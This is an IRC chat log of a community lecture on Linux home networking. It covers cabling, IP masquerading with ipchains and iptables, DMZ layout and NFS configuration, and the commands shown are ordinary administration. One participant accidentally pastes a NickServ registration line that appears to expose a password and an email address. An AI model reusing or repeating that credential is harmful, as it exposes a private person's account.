+<br><b>&lt;Megram></b> ShellFish, cat 5 is category 5, is capable of 10/100mps
+tranfers, and is less prone to interference
+<br><font color="#FF0000">*** Quits: Paya (Quit: Leaving)</font>
+<br><b>&lt;ShellFish></b> ok.. the higher num the better?
+<br><b>&lt;mikestevens></b> There are new emerging types
+<br><b>&lt;mikestevens></b> Cat 5e and Cat 6
+<br><font color="#FF0000">* ]|MooCow|[ moo's...lots</font>
+<br><b>&lt;a|pha[away]></b> which are?
+<br><b>&lt;Megram></b> yeah, tho you will only really encounter cat 3/5
+in a small home lan
+<br><b>&lt;a|pha[away]></b> ..
+<br><b>&lt;b0iler></b> fast ethernet
+<br><b>&lt;kIllah|b></b> CAT 5E != CAT5
+<br><b>&lt;mikestevens></b> They are types for gigabit ethernet
+<br><font color="#FF0000">*** Joins: TracerT</font>
+<br><b>&lt;kIllah|b></b> CAT 5E is allmost same as CAT6
+<br><b>&lt;mikestevens></b> I'm not sure if there are standards on it yet
+<br><b>&lt;Megram></b> if i may, we may want to move on with the lecture,
+unless there are any main outstanding questions
+<br><b>&lt;Serial_Killer></b> btw guys how come i know that my network
+card is detected by linux
+<br><b>&lt;ShellFish></b> the reason im askin is that when we have lan
+paries everyone shouts a lot about "cat" and i just dont understand.. but
+i do now.. tnx
+<br><b>&lt;a|pha[away]></b> i'll look it up in webopedia.com
+<br><b>&lt;Ghost_Rider> Serial_Killer: i saied that on the 1st part of
+the lecture but no prob</b>
+<br><b>&lt;norton></b> .
+<br><b>&lt;Ghost_Rider> Serial_Killer: is it pci?</b>
+<br><b>&lt;mikestevens></b> ok on with the lecture
+<br><b>&lt;Serial_Killer></b> hhee
+<br><b>&lt;Ghost_Rider> mikestevens: Wait..serial has a question..</b>
+<br><b>&lt;mikestevens></b> ok
+<br><b>&lt;Ghost_Rider> Serial_Killer: is it pci?</b>
+<br><b>&lt;Frydo></b> i've got rh5.2 and no /etc/networks - how so ?
+<br><b>&lt;Serial_Killer></b> no yeah
+<br><b>&lt;Serial_Killer></b> yeah*
+<br><b>&lt;Serial_Killer></b> it is
+<br><b>&lt;Ghost_Rider> Serial_Killer: so cat /proc/pci and look for it</b>
+<br><b>&lt;TracerT></b> ive missed somethink?
+<br><font color="#FF0000">*** ]|MooCow|[ is now known as Freezer</font>
+<br><b>&lt;mikestevens></b> TracerT: no still Q&amp;A
+<br><b>&lt;Ghost_Rider> Frydo: well rh sometimes just don't create files
+that you don't really need.. /etc/networks is just a add on</b>
+<br><b>&lt;Serial_Killer></b> ok...
+<br><b>&lt;Ghost_Rider> Frydo: if you create it</b>
+<br><b>&lt;Ghost_Rider> it will work</b>
+<br><font color="#FF0000">*** Quits: Sub (Quit: good users don't use colored
+quits)</font>
+<br><b>&lt;Ghost_Rider> so any other questions?</b>
+<br><font color="#FF0000">*** Joins: XMulder</font>
+<br><b>&lt;Megram></b> one other quick point...
+<br><b>&lt;XMulder></b> wpw
+<br><b>&lt;Frydo></b> - it works without it ...
+<br><b>&lt;XMulder></b> wow
+<br><b>&lt;Serial_Killer></b> btw im using Fast ethernet Adapter 10/100
+MBps PCi
+<br><b>&lt;XMulder></b> so many ppl what is goin on?
+<br><b>&lt;Megram></b> some of you may not know why the example ip GR used
+was 192.168.x.x, we will explain that later if anyone needs to know
+<br><font color="#FF0000">*** Quits: VoRtex (Quit: )</font>
+<br><font color="#FF0000">*** Quits: a|pha[away] (Quit: well... an exit
+is really the entrance into something else...)</font>
+<br><b>&lt;gUeSt51></b> I have a question if I may... maybe not so related,
+I went into /proc/ and looked at pci, I can pico it or cat it, but it shows
+that the file is 0 bytes large.. why is this?
+<br><b>&lt;Ghost_Rider> Megram: well I saied upthere that it was a private
+ip for LAN purposes</b>
+<br><font color="#FF0000">*** Joins: Devil_Panther</font>
+<br><b>&lt;Matt></b> ./proc is a virtual filesystem
+<br><b>&lt;Ghost_Rider> /proc maps ur memory</b>
+<br><b>&lt;Devil_Panther></b> so....
+<br><b>&lt;freeque></b> Ghost_Rider - but u didnt really explain why u
+used class C and not A or B :-P
+<br><b>&lt;Matt></b> its not acutally a device like /dev devices are
+<br><b>&lt;Megram></b> yep, but i can give a bit of history on why that
+ip is used if needed
+<br><b>&lt;TracerT></b> freeque: cos it stands like this
+<br><b>&lt;Matt></b> the closest relation would be a pointer in C, and
+/dev as a reference
+<br><b>&lt;freeque></b> Megram - that would be nice
+<br><b>&lt;Ghost_Rider> freeque: well since I was giving an example</b>
+<br><font color="#FF0000">*** Parts: Balle</font>
+<br><b>&lt;Ghost_Rider> but there's nothing that says you can't use class
+A or B</b>
+<br><b>&lt;Ghost_Rider> ok..moving on</b>
+<br><font color="#FF0000">*** Ghost_Rider sets mode: +m</font>
+<br><font color="#FF0000">*** Quits: Grim_Reaper (Quit: Leaving)</font>
+<br><b>&lt;Ghost_Rider> I think now this is the most important part of
+the lecture</b>
+<br><b>&lt;Ghost_Rider> it's ip masquerade part</b>
+<br><font color="#FF0000">*** Joins: Andrei_</font>
+<br><b>&lt;Ghost_Rider> ip masquerade is a system a NAT (network address
+translation) system</b>
+<br><b>&lt;Ghost_Rider> now what is this you ask...</b>
+<br><b>&lt;Ghost_Rider> well like I saied before we were using private
+ips</b>
+<br><b>&lt;Ghost_Rider> the routers on the internet don't know how to route
+data for those ips</b>
+<br><font color="#FF0000">*** Joins: mayfaer</font>
+<br><b>&lt;Ghost_Rider> so this means that a computer using 192.168.0.2
+ip can't connect to the internet</b>
+<br><font color="#FF0000">*** Quits: Devil_Panther (Quit: The Devil Panther
+will rise again.)</font>
+<br><b>&lt;Ghost_Rider> and also because we want that all our network have
+internet access</b>
+<br><b>&lt;Ghost_Rider> but just using like a dial-up</b>
+<br><b>&lt;Ghost_Rider> so in other words what I'm trying to say is that
+with just one computer of the network that is connected to the internet
+all your network can have access to the internet using the ip masquerade
+capacities</b>
+<br><font color="#FF0000">*** Quits: nocent (Ping timeout)</font>
+<br><font color="#FF0000">*** Quits: jaxler (Ping timeout)</font>
+<br><b>&lt;mikestevens></b> it is a free version of those expensive "personal
+routers"
+<br><b>&lt;Ghost_Rider> and it's not hard to make it work...</b>
+<br><b>&lt;Ghost_Rider> you re-compile the kernel of the box that has the
+ppp connection adding the IP Masquerade support</b>
+<br><b>&lt;Ghost_Rider> besides of that</b>
+<br><b>&lt;Ghost_Rider> you'll need ipchains</b>
+<br><font color="#FF0000">*** gUeSt51 is now known as Obsidian</font>
+<br><font color="#FF0000">*** Quits: Kintege (Quit: )</font>
+<br><b>&lt;Ghost_Rider> now with kerne 2.4.x</b>
+<br><b>&lt;Ghost_Rider> iptables is starting to take over ipchains</b>
+<br><b>&lt;Ghost_Rider> but since I'm still with kernel 2.2.x i'll talk
+what I know in other words ipchains</b>
+<br><font color="#FF0000">*** Quits: Obzerver (Quit: i ll check the logs)</font>
+<br><b>&lt;Ghost_Rider> a single ipchains rule will do the owrk</b>
+<br><font color="#FF0000">*** Joins: Crash_Gnome</font>
+<br><b>&lt;Ghost_Rider> /sbin/ipchains -A forward -s 192.168.0.0/24 -d
+| 192.168.0.0/24 -j MASQ</b>
+<br><b>&lt;Ghost_Rider> /sbin/ipchains -A forward -s 192.168.0.0/24 -d
+! 192.168.0.0/24 -j MASQ</b>
+<br><b>&lt;Ghost_Rider> so any package that comes from 192.168.0.0 network
+and don't goes to that network will be masqued</b>
+<br><b>&lt;Ghost_Rider> in other words will be set to the internet.</b>
+<br><b>&lt;Ghost_Rider> and your LAN will start being able to access internet</b>
+<br><b>&lt;Ghost_Rider> (I'll just talk what really masq does)</b>
+<br><b>&lt;Ghost_Rider> but you also have to do a little configuration
+on your clients</b>
+<br><b>&lt;Ghost_Rider> you have to add a default route and set the box
+with ppp connection as gateway</b>
+<br><font color="#FF0000">*** Quits: nin (Ping timeout)</font>
+<br><font color="#FF0000">*** Quits: Nightshade (Ping timeout)</font>
+<br><b>&lt;Ghost_Rider> so thinking that our router is 192.168.0.0</b>
+<br><font color="#FF0000">*** Quits: Freezer (Quit: The source of our oppression
+is the reason for my anarchy)</font>
+<br><b>&lt;Ghost_Rider> we do /sbin/route -add 0.0.0.0 gateway 192.168.0.1</b>
+<br><font color="#FF0000">*** Joins: Ralph</font>
+<br><font color="#FF0000">*** ChanServ sets mode: +o Ralph</font>
+<br><b>&lt;Ghost_Rider> now to the important part..what really happens
+on our masquerading host</b>
+<br><b>&lt;Ghost_Rider> like I told you ip masquerading is a NAT System</b>
+<br><b>&lt;Mikkkeee></b> rider will u explain load balancing translation,
+where a single ip addy and port is translated to a pool of identical servers
+so taht a single pulblic addy can be served by&nbsp; a number of boxes
+<br><b>&lt;Ralph></b> whao, lotsa people
+<br><b>&lt;Ghost_Rider> explaining this in a very simple way..</b>
+<br><font color="#FF0000">*** Quits: Caboom (Quit: YAQM - yet another quit
+message)</font>
+<br><b>&lt;Ghost_Rider> when you send a request from an inside host to
+an external ip</b>
+<br><b>&lt;Ghost_Rider> it will be used ur router as gateway..to make than
+connection port X will be used</b>
+<br><b>&lt;Ghost_Rider> now the masquerading host will get the package</b>
+<br><b>&lt;Ghost_Rider> check the TO IP: and replace the FROM IP: with
+it's own ppp ip and make the connection on port Z</b>
+<br><b>&lt;Ghost_Rider> now doing all this it will store in a table internal
+machine port X port Z</b>
+<br><font color="#FF0000">*** Joins: Nightshade</font>
+<br><b>&lt;Ghost_Rider> now when the masquerading host receives data from
+port Z</b>
+<br><b>&lt;Ghost_Rider> it check the table</b>
+<br><font color="#FF0000">*** Parts: codz</font>
+<br><b>&lt;Ghost_Rider> see it's for machine and on port X so repalces
+again TO IP: and puts the internal ip and FROM IP: puts the external ip
+we are reaching and sents it to port X</b>
+<br><b>&lt;Ghost_Rider> sorry about just ignoring you mikkkeee what were
+you saying?</b>
+<br><font color="#FF0000">*** H2-0 is now known as H2-0[Away]</font>
+<br><b>&lt;Ghost_Rider> btw I assumed that you already knew it but mikestevens
+told me to remind you anyway</b>
+<br><b>&lt;Ghost_Rider> ip forwarding is disabled by default</b>
+<br><b>&lt;Ghost_Rider> so you have to enable it</b>
+<br><b>&lt;Mikkkeee></b> ahh i said someting about load balancing translation
+<br><b>&lt;Mikkkeee></b> if u were going to explain it deepre
+<br><b>&lt;Mikkkeee></b> er
+<br><b>&lt;Ghost_Rider> echo "1" > /proc/sys/net/ipv4/ip_forward</b>
+<br><font color="#FF0000">*** Ghost_Rider sets mode: -m</font>
+<br><font color="#FF0000">*** Quits: norton (Quit: )</font>
+<br><b>&lt;Ghost_Rider> questions about masquerading?</b>
+<br><b>&lt;TracerT></b> somewhere in the datagram
+<br><b>&lt;TracerT></b> is there writen that out Gateaway is a gateaway
+<br><b>&lt;Mikkkeee></b> rider are u going to explain some problems with
+NAT?
+<br><b>&lt;TracerT></b> and how he knows, wich packets for where they belong
+inside the lan
+<br><b>&lt;TracerT></b> ?
+<br><b>&lt;Ghost_Rider> mikestevens: talking about port probs and unreachilbity?
+I'll go there in a minute</b>
+<br><b>&lt;TracerT></b> out+our
+<br><b>&lt;TracerT></b> out=our
+<br><b>&lt;Nightshade></b> I CAN SPEEEK
+<br><b>&lt;HardW1r3></b> be back in just a second
+<br><b>&lt;Andrei_></b> s
+<br><b>&lt;Mikkkeee></b> like the software that encrypts tcp headers info
+will not work correctly with NAT cause of tcp info must be accessible to
+the ifrewall, stuff like that
+<br><b>&lt;Nightshade></b> Yoooo Woooo
+<br><b>&lt;mikestevens></b> oh if you have 2.4.x and want to do IPMASQ
+<br><font color="#FF0000">*** Quits: HardW1r3 (Quit: )</font>
+<br><b>&lt;mikestevens></b> I have a lil script right here
+<br><b>&lt;TracerT></b> ghost_rider
+<br><font color="#FF0000">*** Quits: Ralph (Ping timeout)</font>
+<br><b>&lt;Nightshade></b> sorry....
+<br><b>&lt;mikestevens></b> echo 1 > /proc/sys/net/ipv4/ip_forward
+<br><b>&lt;mikestevens></b> iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+<br><font color="#FF0000">* Nightshade shuts right up</font>
+<br><b>&lt;Ghost_Rider> traceT: like i told the gateway sets a table which
+is called the masquerade table</b>
+<br><b>&lt;CodE4></b> why they at some places that one should set this
+fragmentation option too in addition to forward
+<br><b>&lt;Ghost_Rider> on that table will be setted the internal host
+that sent the request</b>
+<br><b>&lt;Ghost_Rider> the port that comunicates to the gateway</b>
+<br><b>&lt;Ghost_Rider> and the port which the gateway is comunitating
+to the remote host</b>
+<br><font color="#FF0000">*** Quits: Cyberwolf (Ping timeout)</font>
+<br><b>&lt;Ghost_Rider> that allows the gateway to know when he receives
+a package from where to route it</b>
+<br><b>&lt;TracerT></b> so from outside, if you read the datagram, youl
+know that there are some PC in lan, after the gateaway?
+<br><b>&lt;Ghost_Rider> TracerT: if you are trying to make the connection
+from the outside to get inside you can't..I'll get there in a sec</b>
+<br><b>&lt;TracerT></b> no!
+<br><font color="#FF0000">*** Joins: bracaman</font>
+<br><b>&lt;TracerT></b> if you READ the datagram from outside, can you
+know the internel IPs
+<br><b>&lt;Megram></b> no
+<br><b>&lt;Ghost_Rider> nope</b>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v bracaman</font>
+<br><b>&lt;Ghost_Rider> TracerT: from the outside</b>
+<br><b>&lt;Ghost_Rider> you think you are being contact</b>
+<br><b>&lt;Ghost_Rider> from the masquerading host</b>
+<br><b>&lt;TracerT></b> after that GateAway of ours. Its like a wingate.
+right?
+<br><b>&lt;Ghost_Rider> because like I told the ips we were using are UNroutable</b>
+<br><b>&lt;freeque></b> you might have answered this, and it's not even
+a very good question, but just out of interest, is there a limit to the
+number of computers whose ips you can masquerade?
+<br><b>&lt;Megram></b> yes, 65k
+<br><b>&lt;TracerT></b> OK, so how the gateaway knows wich packet, to where
+he belongs, after the packet is recieved from outside?
+<br><b>&lt;bracaman></b> i think Ghost_Rider is lying...
+<br><b>&lt;bracaman></b> :)
+<br><b>&lt;Megram></b> TracerT, ill explain the details to you in pvt...
+<br><font color="#FF0000">*** Joins: Ralph</font>
+<br><font color="#FF0000">*** ChanServ sets mode: +o Ralph</font>
+<br><b>&lt;Mikkkeee></b> not really nat allows an entire class B sized
+network to hide behind a single ip addy
+<br><b>&lt;TracerT></b> 10X
+<br><b>&lt;Mikkkeee></b> not really NAT allows an entire class B sized
+network to hide behind a single ip addy
+<br><b>&lt;Frydo></b> any chance I can do this trick with windows ? not
+as a proxy I mean.
+<br><b>&lt;freeque></b> so 65,000 or unlimited?
+<br><font color="#FF0000">*** Quits: Andrei_ (Quit: BitchX-1.0c18 -- just
+do it.)</font>
+<br><b>&lt;mikestevens></b> Actually you can use 10.0.0.0/16
+<br><b>&lt;TracerT></b> frydo: wingate
+<br><b>&lt;mikestevens></b> errr
+<br><b>&lt;TracerT></b> form win98 you can do it!
+<br><b>&lt;mikestevens></b> 10.0.0.0/8
+<br><font color="#FF0000">* freeque confuzzled</font>
+<br><font color="#FF0000">*** Joins: binz</font>
+<br><b>&lt;Frydo></b> not the same, it's a proxy.
+<br><b>&lt;Infini7y></b> : )
+<br><b>&lt;binz></b> is the lecture over?
+<br><b>&lt;freeque></b> mikestevens - class b is /16 is it not?
+<br><b>&lt;Ghost_Rider> binz: nope</b>
+<br><b>&lt;Mikkkeee></b> well for nt which doens't provide this fuction,
+u must use a third party firewall if u want to use NAT. thats for the window
+questions
+<br><b>&lt;Ghost_Rider> freeque: yeah..class B is /16</b>
+<br><b>&lt;shady_harrasment_panda></b> btw good lecturer i was enjoying
+it but i have to go i fell to sick to stay up
+<br><b>&lt;shady_harrasment_panda></b> bye ppl
+<br><b>&lt;Ghost_Rider> because 2 octects are fixed</b>
+<br><b>&lt;mikestevens></b> I corrected myself
+<br><b>&lt;mikestevens></b> above
+<br><b>&lt;mikestevens></b> &lt;mikestevens> 10.0.0.0/8
+<br><b>&lt;Mikkkeee></b> nah there is a third part and an suprise lecture
+<br><font color="#FF0000">*** Parts: shady_harrasment_panda</font>
+<br><b>&lt;Ghost_Rider> so shall we continue?</b>
+<br><b>&lt;Mikkkeee></b> its all yours
+<br><b>&lt;Ellis_D></b> yes
+<br><font color="#FF0000">*** Ghost_Rider sets mode: +m</font>
+<br><b>&lt;bracaman></b> can opers speak when the chan is moderated?
+<br><b>&lt;mikestevens></b> yes
+<br><b>&lt;bracaman></b> :))
+<br><b>&lt;Ghost_Rider> ok..so like we were saying ip masquerading is really
+cute but it has some problems</b>
+<br><b>&lt;Mikkkeee></b> yup and voice
+<br><b>&lt;Ghost_Rider> like if you need someone to connect to a host inside
+ur network it can't..</b>
+<br><b>&lt;Ghost_Rider> or like if you wanna use ftp or any other protocol</b>
+<br><b>&lt;Ghost_Rider> that works in a way that the remote host makes
+a connection to you it won't work..</b>
+<br><b>&lt;Ghost_Rider> well that's not interily true</b>
+<br><b>&lt;Ghost_Rider> you have the kernel modules to support ftp on active
+mode</b>
+<br><b>&lt;Ghost_Rider> you have kernel modules for real audio</b>
+<br><b>&lt;Ghost_Rider> for dcc over irc</b>
+<br><font color="#FF0000">*** Quits: binz (Quit: cya)</font>
+<br><b>&lt;Ghost_Rider> and a couple of other services</b>
+<br><font color="#FF0000">*** Joins: Andrei_</font>
+<br><b>&lt;Ghost_Rider> that will work one part of the prob</b>
+<br><b>&lt;Ghost_Rider> but what about if you really wanna allow ppl like
+to login in one of our boxes</b>
+<br><font color="#FF0000">*** Joins: RedShadow</font>
+<br><b>&lt;Ghost_Rider> well the answer to that is a program called ipmasqadm</b>
+<br><font color="#FF0000">*** Quits: Nightshade (Ping timeout)</font>
+<br><b>&lt;Ghost_Rider> you can find it at freshmeat.net</b>
+<br><b>&lt;Ghost_Rider> and what it does ir redirect traffic from localhost
+port X to remote HOST port Z</b>
+<br><font color="#FF0000">*** RedShadow is now known as _RedShadow-</font>
+<br><font color="#FF0000">*** Joins: Craft</font>
+<br><font color="#FF0000">*** SteeLe sets mode: +v _RedShadow-</font>
+<br><font color="#FF0000">*** _RedShadow- is now known as RedShadow</font>
+<br><font color="#FF0000">*** Craft is now known as Sup|ED-209|Craft</font>
+<br><b>&lt;Ghost_Rider> but allowing ppl to connect inside our network</b>
+<br><b>&lt;Ghost_Rider> might be unsecure</b>
+<br><font color="#FF0000">*** Joins: HellFish</font>
+<br><b>&lt;Ghost_Rider> since if it roots that box it's one step to root
+the intire network</b>
+<br><b>&lt;Ghost_Rider> so it's time to talk about the concept of DMZ</b>
+<br><font color="#FF0000">*** Quits: ShellFish (Killed (NickServ (GHOST
+command used by HellFish)))</font>
+<br><font color="#FF0000">*** HellFish is now known as shellfish</font>
+<br><b>&lt;Ghost_Rider> DMZ stands for De-Militarized Zone</b>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v Sup|ED-209|Craft</font>
+<br><font color="#FF0000">*** Parts: mayfaer</font>
+<br><b>&lt;Ghost_Rider> if you check example 3 you'll see what I'm talking
+about</b>
+<br><b>&lt;Ghost_Rider> the DMZ is a subnet were the untrusted host are</b>
+<br><font color="#FF0000">*** Joins: HardW1r3</font>
+<br><font color="#FF0000">*** ChanServ sets mode: +v HardW1r3</font>
+<br><font color="#FF0000">*** Quits: zwanderer (Quit: Liberae sunt nostrae
+cogitationes)</font>
+<br><b>&lt;HardW1r3></b> im back
+<br><b>&lt;Ghost_Rider> a way of doing this kind of DMZ</b>
+<br><b>&lt;Sup|ED-209|Craft></b> who many ppl here...
+<br><b>&lt;Ghost_Rider> is setting ur masquerading host with 2 ethernet
+cards</b>
+<br><b>&lt;Mikkkeee></b> sorry to cut in rider, problems with NAT also
+occur with software that embeds TCP/IP address info inside TCP/IP packets
+and tehn relies upon that information will not work cause the interior
+tcp/ip address info will be wrong, this occurs with FTP and other protocols.
+<br><b>&lt;mikestevens></b> like AIM or FTP
+<br><b>&lt;Ghost_Rider> still you guys have the modules</b>
+<br><b>&lt;mikestevens></b> there are modules for FTP
+<br><b>&lt;mikestevens></b> and a few others
+<br><b>&lt;Mikkkeee></b> PPTP, Sqlnet2, FTP, and best of all IRC.
+<br><font color="#FF0000">*** Joins: jaxler</font>
+<br><font color="#FF0000">*** Joins: UraniumD</font>
+<br><b>&lt;Ghost_Rider> mikestevens: but why are you cutting of if I already
+told that?</b>
+<br><b>&lt;Ghost_Rider> Mikkkeee: but why are you cutting of if I already
+told that?</b>
+<br><b>&lt;Mikkkeee></b> u did
+<br><b>&lt;Mikkkeee></b> sorry
+<br><b>&lt;Ghost_Rider> it was for mikkkee not mikestevens</b>
+<br><b>&lt;Ghost_Rider> I did</b>
+<br><b>&lt;Ghost_Rider> no prob</b>
+<br><b>&lt;Mikkkeee></b> sorry
+<br><font color="#FF0000">*** Quits: ryph (Quit: )</font>
+<br><b>&lt;Ghost_Rider> well continuing</b>
+<br><font color="#FF0000">*** Joins: freerider</font>
+<br><b>&lt;Ghost_Rider> other way of implementing a DMZ</b>
+<br><b>&lt;Ghost_Rider> is setting a ip masquerading host</b>
+<br><b>&lt;Ghost_Rider> inside the LAN</b>
+<br><b>&lt;Ghost_Rider> which is example 4</b>
+<br><font color="#FF0000">*** Quits: XMulder (Quit: )</font>
+<br><b>&lt;Ghost_Rider> of course this kind of network aren't home networks
+but I think it's always good to know about this stuff</b>
+<br><b>&lt;Ghost_Rider> the most imporant thing is that ur LAN won't trust
+the DMZ</b>
+<br><b>&lt;Ghost_Rider> so in my opnino the best way to implement it is
+using the so call 2 legged network</b>
+<br><b>&lt;Ghost_Rider> that is the ip masquerade host with 2 ethernet
+cards</b>
+<br><b>&lt;Ghost_Rider> then you would setup the firewall to allow traffic
+for the DMZ ethernet interface but not for the trusted LAN</b>
+<br><b>&lt;Ghost_Rider> do you guys wanna add anything?</b>
+<br><font color="#FF0000">*** Quits: muncheese (Quit: Leaving)</font>
+<br><b>&lt;Ghost_Rider> shall we stop for questions about DMZs?</b>
+<br><b>&lt;Sup|ED-209|Craft></b> which firewall you are using?
+<br><b>&lt;Ghost_Rider> I use ipchains</b>
+<br><b>&lt;Mikkkeee></b> ipchains
+<br><font color="#FF0000">*** Quits: UraniumD (Ping timeout)</font>
+<br><font color="#FF0000">*** Ghost_Rider sets mode: -m</font>
+<br><b>&lt;Ghost_Rider> anyone has questions that wanna ask?</b>
+<br><b>&lt;kn1x></b> so could a DMZ be setup like a 'honeypot'?
+<br><b>&lt;Frydo></b> why connect the trusted lan to the router in the
+first place ?
+<br><b>&lt;Ghost_Rider> Frydo: because you want the trusted lan to have
+access to the internet</b>
+<br><font color="#FF0000">*** Quits: SpiderMan (Ping timeout)</font>
+<br><b>&lt;Ghost_Rider> Frydo: and you just have a ppp-dial up connection</b>
+<br><b>&lt;Ghost_Rider> kn1x: yes..but it's not the major thought when
+setting up a DMZ</b>
+<br><font color="#FF0000">*** Quits: Infini7y (Connection reset by peer)</font>
+<br><b>&lt;Frydo></b> but where's the difference to the dmz then ? if you
+hack the router the protection is gone !?!
+<br><b>&lt;Ghost_Rider> when you setup a DMZ you are thinking in giving
+services to the internet but not taking very risk at it</b>
+<br><b>&lt;kn1x></b> well could you trick an attacker, by making him think
+that was your network, when it is actually hidden further in..?
+<br><b>&lt;mikestevens></b> kn1x: yes
+<br><b>&lt;Ghost_Rider> Frydo: well if you root the router is it's the
+same thing all network is in a bad situaton</b>
+<br><b>&lt;mikestevens></b> the real network is hidden behind NAT
+<br><b>&lt;Ghost_Rider> Frydo: but if you hack like the mail server</b>
+<br><b>&lt;Ghost_Rider> Frydo: that's not so bad..since the DMZ is suposed
+to be under hevially watching</b>
+<br><font color="#FF0000">* Sup|ED-209|Craft is reading http://www.linuxdoc.org/HOWTO/IPCHAINS-HOWTO-2.html</font>
+<br><b>&lt;Mikkkeee></b> well faults in static traslation won't protect
+the internal host
+<br><b>&lt;Ghost_Rider> Frydo: and since traffic from DMZ --> trusted LAN</b>
+<br><b>&lt;Ghost_Rider> Frydo: won't be routed</b>
+<br><b>&lt;Ghost_Rider> Frydo: you gain some time there...</b>
+<br><b>&lt;Frydo></b> got it
+<br><b>&lt;Ghost_Rider> Frydo: of course like you root the firewall the
+LAN is doomed</b>
+<br><font color="#FF0000">*** Joins: Nightshade</font>
+<br><b>&lt;Ghost_Rider> but since the firewall isn't really running services</b>
+<br><b>&lt;Andrei_></b> Ghost_Rider
+<br><b>&lt;Ghost_Rider> it's just redirecting them to the DMZ</b>
+<br><b>&lt;Ghost_Rider> andrei_ : yes?</b>
+<br><b>&lt;Andrei_></b> i'm soryy to interrup this discution
+<br><b>&lt;Andrei_></b> but i can'd set up my internal network
+<br><b>&lt;Ghost_Rider></b> what's ur prob?
+<br><b>&lt;freeque></b> lol. he charges &pound;50 and hour :-)
+<br><b>&lt;Andrei_></b> in fact i camn't give internet access to a computer
+<br><b>&lt;Ghost_Rider> lo@freeque</b>
+<br><b>&lt;Ghost_Rider> Andrei_: but is ur LAN working, like you can ping
+lan hosts, you can't just masq?</b>
+<br><b>&lt;Andrei_></b> iexactly
+<br><b>&lt;Andrei_></b> i can ping
+<br><b>&lt;Ghost_Rider></b> Andrei_: can you ping ur ppp0 ip?
+<br><b>&lt;Andrei_></b> my internat network works just fine
+<br><b>&lt;freerider></b>&nbsp; /freerider REGISTER 2825902 cantnot@adinet.com.uy
+<br><b>&lt;Sup|ED-209|Craft></b> Ghost_Rider: have you read David Ranch's
+faq?
+<br><b>&lt;Andrei_></b> Ghost_Rider nope
+<br><font color="#FF0000">*** Mikkkeee sets mode: +o RedShadow</font>
+<br><b>&lt;Andrei_></b> that's the problem
+<br><b>&lt;Ghost_Rider> Sup|ED-209|Craft: I don't think so why?</b>
+<br><b>&lt;Nightshade></b> Ok guys, thats me for tonight, c ya laterz
+<br><font color="#FF0000">*** Parts: Nightshade</font>
+<br><b>&lt;Ghost_Rider> Andrei_: well check ur routing table..I'll keep
+with you on private</b>
+<br><b>&lt;Ghost_Rider> guys the lecture is going on..for the final part</b>
+<br><font color="#FF0000">*** Ghost_Rider sets mode: +m</font>
+<br><b>&lt;Sup|ED-209|Craft></b> Ghost_Rider: maybe usefull to read @ http://www.linuxdoc.org/HOWTO/IP-Masquerade-HOWTO.html
+?
+<br><b>&lt;Ghost_Rider> oh...ip masquerade howto yes I read it when I setting
+up my 1st lan hehe</b>
+<br><font color="#FF0000">* Mikkkeee says guys if u don't understand/still
+got questions all will be clear once rider releases the tut</font>
+<br><font color="#FF0000">*** Joins: |\Lesma\|</font>
+<br><font color="#FF0000">*** |\Lesma\| is now known as samurai</font>
+<br><b>&lt;Ghost_Rider> so guys this puts us on the final topic and most
+buggy one too NFS</b>
+<br><b>&lt;Ghost_Rider> (damn I was seeing that I would never end this
+lecture)</b>
+<br><b>&lt;mikestevens></b> I want AFS or CODA!!!
+<br><font color="#FF0000">*** Joins: SileNceR</font>
+<br><b>&lt;mikestevens></b> sorry
+<br><b>&lt;Ghost_Rider> as usual mike giving it's very unique taste to
+the chat</b>
+<br><b>&lt;mikestevens></b> lol
+<br><b>&lt;Sup|ED-209|Craft></b> lol
+<br><b>&lt;Ghost_Rider> but let's keep going</b>
+<br><b>&lt;Ghost_Rider> nfs stands for network file system</b>
+<br><font color="#FF0000">*** Retrieving #bsrf info...</font>
+<br><b>&lt;Ghost_Rider> I once read a very simple definition nfs = file
+sharing windows for *nix</b>
+<br><b>&lt;Ghost_Rider> yes..that's true</b>
+<br><b>&lt;Ghost_Rider> but NFS</b>
+<br><b>&lt;Ghost_Rider> is much more configurable</b>
+<br><b>&lt;Megram></b> sorry guys, i need to run off, sleep is calling.
+Have fun all of you :O)
+<br><b>&lt;Sup|ED-209|Craft></b> nt filesystem
+<br><b>&lt;Megram></b> gj so far btw GR :O)
+<br><font color="#FF0000">*** Quits: Megram (Quit: Why do we need cheese?)</font>
+<br><font color="#FF0000">*** H2-0[Away] is now known as H2-0</font>
+<br><font color="#FF0000">*** Quits: H2-0 (Quit: good users don't use colored
+quits)</font>
+<br><b>&lt;Ghost_Rider> to make nfs available</b>
+<br><b>&lt;Ghost_Rider> you have to put some really buggy daemons running</b>
+<br><b>&lt;Ghost_Rider> I know at least 2 linux worms uses portmap probs
+to spread and you will need to use portmap</b>
+<br><b>&lt;Ghost_Rider> rpc.portmap, rpc.mountd and rpc.nfsd</b>
+<br><b>&lt;Ghost_Rider> will be the services you'll need to run to allow
+nfs</b>
+<br><b>&lt;Ghost_Rider> now one questions that we ask when we are setting
+up NFS is "is this really necessary?"</b>
+<br><b>&lt;Ghost_Rider> well NFS is slow as hell, if you need anything
+from one computer to other you can just start a ftp deamon and upload or
+download</b>
+<br><b>&lt;Sup|ED-209|Craft></b> can somebody give me your plan(s)?
+<br><b>&lt;Ghost_Rider> it would be faster...</b>
+<br><b>&lt;Ghost_Rider> Sup|ED-209|Craft: i'm almost finishing...it's last
+topic man</b>
+<br><b>&lt;Sup|ED-209|Craft></b> ok
+<br><b>&lt;Ghost_Rider> to make this quick since you guys are already tired
+of reading what I say</b>
+<br><b>&lt;Ghost_Rider> you have 3 main files to configure NFS</b>
+<br><b>&lt;Ghost_Rider> /etc/hosts.allo /etc/hosts.deny and /etc/exports</b>
+<br><font color="#FF0000">*** Joins: SpiderMan</font>
+<br><font color="#FF0000">*** ChanServ sets mode: +o SpiderMan</font>
+<br><font color="#FF0000">*** Quits: freerider (Quit: Leaving)</font>
+<br><b>&lt;Ghost_Rider> /etc/hosts.allow /etc/hosts.deny and /etc/exports</b>
+<br><b>&lt;Ghost_Rider> hosts.allow and hosts.deny will check allow or
+deny connections from hosts</b>
+<br><font color="#FF0000">*** Joins: Hand_of_God</font>
+<br><b>&lt;Ghost_Rider> you just allow ur local network and deny all the
+rest</b>
+<br><b>&lt;Ghost_Rider> so hosts.allow would be something like</b>
+<br><b>&lt;Ghost_Rider> rpc.portmap: 192.168.0.0/24</b>
